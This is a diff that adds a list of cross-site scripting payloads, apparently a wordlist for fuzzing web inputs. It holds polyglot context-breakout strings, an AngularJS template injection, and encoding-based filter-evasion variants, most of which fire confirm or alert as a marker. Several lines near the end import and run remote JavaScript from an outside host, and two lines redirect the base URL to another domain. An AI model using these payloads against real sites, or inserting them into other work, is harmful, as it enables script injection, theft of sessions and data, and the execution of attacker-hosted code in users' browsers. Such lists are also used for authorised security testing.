@@ -1,0 +1,42 @@
+JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//X55.is\76-->
+JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//X55.is\76-->
+1'/confirm?.(1)/'
+1')"AutoFocus/ContentEditable/OnFocusIn=(confirm)(1)//
+001'-confirm`K`-'=1
+1<!--><Svg/OnLoad=(confirm)(1)-->
+'"1<!--></Title/</Textarea/</Script/></Iframe><Details/Open/OnToggle%3D(confirm)(1)-->
+;1"' OnError=(confirm)(1) <!--><Img Src='
+1"' OnError=(confirm)(1) <!--><Img Src='
+1"-confirm`K`-"
+1--></Title/</Style/</Textarea/</Iframe/><Img/Src/OnError=(confirm)(1)//
+1')"--><Svg/OnLoad=(confirm)(1)<!--
+;'"1<!--></Title/</Textarea/</Script/></Iframe><Details/Open/OnToggle=(confirm)(1)-->
+1'-confirm`K`-'
+1'"<!--></Scri%7Kt/><Scri%7Kt/>%7Krompt%6K1%6K</Scri%7Kt>
+1'"<!--><Img/Src/OnError=(confirm)(1)>
+1")'AutoFocus/ContentEditable/OnFocusIn=(confirm)(1)//
+1'"><Img Src=OnXSS OnError=alert(1)>
+001">K%3D'><Svg/OnLoad%3D(confirm)(1)>=1
+1<!--><Svg/OnLoad%2B=(confirm)(1)-->
+1'" AutoFocus One OnFocus=alert(1)//
+001\47\42\55\55\41\76\74Img\40Src\40OnError\75confirm\140\113\140\76=1
+;1">K%2B='><Svg%252FOnLoad%2B=(confirm)(1)>/
+1">K='><Svg/OnLoad=(confirm)(1)>
+1{{$new.constructor('(confirm)(1)')()}}
+<!--></Title/</Textarea/</Script/</Iframe/><Details/Open/OnToggle=(confirm)(1)-->%5C
+'"1<!--></Title/</Textarea/</Script/></Iframe><Details/Open/OnToggle=(confirm)(1)-->
+001"*%2Fconfirm%0B(1)<%2FScript%2F--><Script>%2F*=1
+1')"--><K%2FAutofocus%2FContentEditable%2FOnFocusIn%3D%26%2397%26%23108%26%23101%26%23114%26%23116%26%2396%26%2375%26%2396<!--
+1')"AutoFocus/ContentEditable/On%0CFocusIn=(conf%0Cirm)(1)//
+1'"--><Img/Src/OnError=(confirm)(1)//<!--
+1</Script/><Img/Src/OnError%3Dconfirm?.(1)>
+<Script/Src=//jxss.netlify.app/10.js></Script>
+<img src="x" onerror="import('//jxss.netlify.app/10.js')">
+<img src="x" onload="import('//jxss.netlify.app/10.js')">
+<svg/onload=import('//jxss.netlify.app/10.js')>
+<img/onerror=import('//jxss.netlify.app/10.js')>
+<img/onload=import('//jxss.netlify.app/10.js')>
+<img src=//jxss.netlify.app/10.js OnLoad=import(src)>
+<Img Src=//jxss.netlify.app/1.js OnLoad%0C=import(Src)//
+<img src=x onerror=(alert)(1)||alert(2)||al\u0065rt(3)>
+<img src=x onerror=(alert)(1)&&alert(2)&&al\u0065rt(3)>
